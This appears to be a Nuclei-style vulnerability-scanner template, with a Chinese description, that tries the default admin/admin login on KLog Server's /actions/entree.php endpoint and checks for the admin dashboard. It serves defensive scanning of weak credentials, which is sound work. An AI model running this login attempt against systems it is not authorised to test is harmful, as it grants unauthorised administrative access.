id: klog-server-default-login

info:
  name: KLog Server 默认口令登录（弱口令）
  author: s4e-io
  severity: high
  description: |
    该模板通过尝试 KLog Server 的默认账号口令，并依据认证成功后的响应特征判断目标是否仍在使用未修改的弱口令。若命中，攻击者可直接登录系统，进一步访问敏感信息、修改配置或执行未授权操作。
  reference:
    - https://www.klogserver.com/
  metadata:
    max-request: 2
    vendor: klogserver
    product: klog_server
  tags: default-login,klog-server,vuln

http:
  - raw:
      - |
        POST /actions/entree.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user={{username}}&pswd={{password}}&action=login

      - |
        GET /index.php HTTP/1.1
        Host: {{Hostname}}

    attack: pitchfork
    payloads:
      username:
        - admin
      password:
        - admin

    host-redirects: true
    max-redirects: 3

    matchers:
      - type: dsl
        dsl:
          - 'contains_all(body, "<title>KLog Server", "ADMIN", "Dashboard")'
          - 'status_code == 200'
        condition: and
